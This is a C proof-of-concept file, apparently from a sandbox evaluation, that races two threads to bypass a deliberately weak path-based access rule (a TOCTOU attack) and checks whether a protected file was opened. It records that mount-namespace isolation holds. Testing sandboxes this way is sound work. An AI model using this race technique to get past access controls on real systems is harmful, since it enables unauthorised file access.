/*
 * a6_toctou.c - Attack A6: TOCTOU race against a path-based rule
 *
 * Two threads share a path buffer.
 * - Main thread: repeatedly calls open() on the buffer.
 * - Racer thread: continuously flips the buffer between a harmless path
 *   ("/etc/hostname") and a protected path.
 *
 * Run with --unsafe-path-policy --protected-path <protected> to trigger
 * the deliberately weak rule. Then run again with the protected file kept
 * outside the root filesystem to show that mount-namespace isolation holds.
 *
 * Expected behaviour:
 *   Weak policy (--unsafe-path-policy):
 *     With --race-delay-us 2000, the bypass is nearly certain.
 *   Intended design (protected file outside rootfs):
 *     open() fails with ENOENT regardless of the race.
 *
 * Report Table II row A6:
 *   Pattern: TOCTOU race on a path rule
 *   Layer:   weak policy, mount ns
 *   Result:  weak rule bypassed; mount ns holds
 */

#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

/* --- Configuration ---
 * Pass the protected path as the first argument, e.g.:
 *   ./a6_toctou /protected/secret.txt
 * Default if no argument is given: */
#define DEFAULT_PROTECTED "/protected/secret.txt"
#define SAFE_PATH         "/etc/hostname"
#define RACE_ITERATIONS   5000

/* Shared path buffer between threads */
static char shared_path[4096];
static volatile int stop_racer = 0;
static int protected_opens = 0;        /* how many times we opened protected */
static const char *protected_path;

/* Racer thread: flip the buffer between safe and protected */
static void *racer(void *arg) {
    (void)arg;
    while (!stop_racer) {
        /* flip to protected */
        strncpy(shared_path, protected_path, sizeof(shared_path) - 1);
        /* yield to give the main thread a chance to race */
        sched_yield();
        /* flip back to safe */
        strncpy(shared_path, SAFE_PATH, sizeof(shared_path) - 1);
        sched_yield();
    }
    return NULL;
}

int main(int argc, char *argv[]) {
    protected_path = (argc >= 2) ? argv[1] : DEFAULT_PROTECTED;

    printf("[A6] TOCTOU race demo\n");
    printf("[A6] protected path: %s\n", protected_path);
    printf("[A6] safe path:      %s\n", SAFE_PATH);
    printf("[A6] iterations:     %d\n", RACE_ITERATIONS);

    /* Initialise shared buffer to the safe path */
    strncpy(shared_path, SAFE_PATH, sizeof(shared_path) - 1);

    /* Start the racer thread */
    pthread_t t;
    pthread_create(&t, NULL, racer, NULL);

    /* Main thread: open the shared buffer in a tight loop */
    for (int i = 0; i < RACE_ITERATIONS; i++) {
        int fd = open(shared_path, O_RDONLY);
        if (fd >= 0) {
            /* Check whether we actually opened the protected file */
            char link[64], target[4096];
            snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
            ssize_t n = readlink(link, target, sizeof(target) - 1);
            if (n > 0) {
                target[n] = '\0';
                if (strcmp(target, protected_path) == 0) {
                    protected_opens++;
                    printf("[A6] RACE WIN #%d at iteration %d: opened %s\n",
                           protected_opens, i, protected_path);
                }
            }
            close(fd);
        }
        /* errno == EPERM → denied by policy; errno == ENOENT → outside rootfs */
    }

    stop_racer = 1;
    pthread_join(t, NULL);

    printf("[A6] RESULT: protected file opened %d / %d times\n",
           protected_opens, RACE_ITERATIONS);
    if (protected_opens == 0)
        printf("[A6] mount namespace (or policy) held — no bypass\n");
    else
        printf("[A6] TOCTOU bypass succeeded %d times\n", protected_opens);

    return (protected_opens > 0) ? 1 : 0;
}
